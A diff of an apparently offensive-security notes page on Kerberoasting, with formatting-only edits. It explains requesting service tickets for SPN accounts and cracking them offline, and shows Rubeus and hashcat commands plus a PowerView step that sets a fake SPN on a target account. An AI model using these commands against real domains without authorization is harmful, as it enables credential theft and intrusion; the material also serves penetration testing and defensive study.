@@ -1,13 +1,14 @@
 ---
 title: "Kerberoasting"
 ---
+
 Any authenticated domain user can request a TGS (service ticket) for any account with a registered SPN. The KDC encrypts part of the TGS with the service account's NTLM hash: take that ticket offline and crack the hash without further interaction with the domain.
 
 ## How It Works
 
 Normal TGS flow:
 
-```
+```text
 1. Client → KDC: "I want a ticket for service X" (TGS-REQ)
                   includes their TGT as proof of identity
 2. KDC → Client: TGS ticket encrypted with the SERVICE ACCOUNT'S NTLM hash
@@ -18,7 +19,7 @@ The problem: any authenticated domain user can request a TGS for any SPN. The KD
 
 Since the TGS is encrypted with the service account's hash, you take it offline and crack it:
 
-```
+```text
 authenticated user → request TGS for SPN → get $krb5tgs$ blob → crack offline → plaintext password
 ```
 
@@ -76,7 +77,7 @@ Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes.txt
 
 RC4 hashes (etype 23, `$krb5tgs$23$*`) crack much faster than AES256: try to force RC4 with `/tgtdeleg` if the service account is RC4 capable.
 
-```bash
+```bash wrap
 # RC4 (etype 23): hashcat mode 13100
 hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
 hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou -r /usr/share/hashcat/rules/best64.rule
@@ -89,7 +90,7 @@ hashcat -m 19700 hashes.txt ~/tools/wordlists/rockyou
 
 If you have `GenericWrite` on a user account, you can set an SPN on it, request the TGS, then clean up. Useful for accounts that do not normally have SPNs.
 
-```powershell
+```powershell wrap
 # Step 1: Set a fake SPN on the target account
 Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
 
